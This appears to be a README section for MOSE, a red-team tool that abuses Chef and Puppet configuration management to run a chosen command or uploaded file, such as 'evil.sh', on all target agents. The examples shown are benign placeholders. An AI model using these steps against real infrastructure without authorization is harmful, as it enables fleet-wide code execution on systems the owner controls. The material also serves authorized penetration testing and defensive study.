## Instructions to run a command
To run a command on all target agents, you can do the following:
1. Run MOSE with the following options:
``
./mose -c <command> -t <target CM>
``
For example:
``
./mose -c "echo HELLO >> /tmp/friendlyFile.txt" -t chef
``

2. On the target, download the payload that is being served (assuming you opted to have MOSE serve it for you) and give it execute permissions

3. Run the payload:
``
./<cm target>-<cm os>
``
For example:
``
./chef-linux
``

If you want to clean up after you're done, run the payload again with the `-c` option.

## Instructions to upload and run a file
This functionality is supported on both puppet and chef. It will allow you to specify a script or a binary that you want to run on the target agents.

1. Run MOSE with the following options: 
``
./mose -fu <name of file> -t <target CM>
``
For example:
``
./mose -fu evil.sh -t puppet
``
2. On the target, download the payload that is being served (assuming you opted to have MOSE serve it for you) and give it execute permissions

3. Extract the payload:
``
tar -vxf files.tar
``

4. Run the payload:
``
./<cm target>-<cm os>
``
For example:
``
./puppet-linux
``

If you want to clean up after you're done, run the payload again with the `-c` option.
